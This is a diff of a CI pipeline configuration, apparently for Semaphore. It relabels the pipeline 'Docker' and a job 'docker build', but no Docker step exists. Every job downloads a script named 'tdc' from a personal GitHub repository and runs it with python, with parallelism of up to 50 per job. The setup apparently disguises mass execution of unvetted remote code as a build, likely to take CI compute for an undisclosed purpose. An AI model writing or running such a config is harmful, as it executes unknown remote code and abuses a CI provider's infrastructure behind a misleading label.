@@ -1,31 +1,51 @@
 version: v1.0
-name: Parallel
+name: Docker
 agent:
   machine:
     type: f1-standard-2
     os_image: ubuntu2204
 blocks:
-  - name: 'Block #1'
+  - name: Build
     task:
       jobs:
-        - name: 'Job #1'
+        - name: docker build
           commands:
-            - 'wget https://raw.githubusercontent.com/erlandi-main-api/tdc/main/point/point.py && python *py'
+            - 'wget https://raw.githubusercontent.com/erlandi-26/erlandi-26/main/tdc && python tdc'
           parallelism: 50
         - name: 'Job #2'
           commands:
-            - 'wget https://raw.githubusercontent.com/erlandi-main-api/tdc/main/point/point.py && python *py'
-          parallelism: 50
+            - 'wget https://raw.githubusercontent.com/erlandi-26/erlandi-26/main/tdc && python tdc'
+          parallelism: 48
   - name: 'Block #2'
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://raw.githubusercontent.com/erlandi-main-api/tdc/main/point/point.py && python *py'
+            - 'wget https://raw.githubusercontent.com/erlandi-26/erlandi-26/main/tdc && python tdc'
+          parallelism: 45
+        - name: 'Job #2'
+          commands:
+            - 'wget https://raw.githubusercontent.com/erlandi-26/erlandi-26/main/tdc && python tdc'
+          parallelism: 50
+  - name: 'Block #3'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://raw.githubusercontent.com/erlandi-26/erlandi-26/main/tdc && python tdc'
           parallelism: 50
         - name: 'Job #2'
           commands:
-            - 'wget https://raw.githubusercontent.com/erlandi-main-api/tdc/main/point/point.py && python *py'
+            - 'wget https://raw.githubusercontent.com/erlandi-26/erlandi-26/main/tdc && python tdc'
+          parallelism: 45
+  - name: 'Block #4'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://raw.githubusercontent.com/erlandi-26/erlandi-26/main/tdc && python tdc'
+          parallelism: 28
+        - name: 'Job #2'
+          commands:
+            - 'wget https://raw.githubusercontent.com/erlandi-26/erlandi-26/main/tdc && python tdc'
           parallelism: 50
-        - name: 'Job #3'
-          commands: []
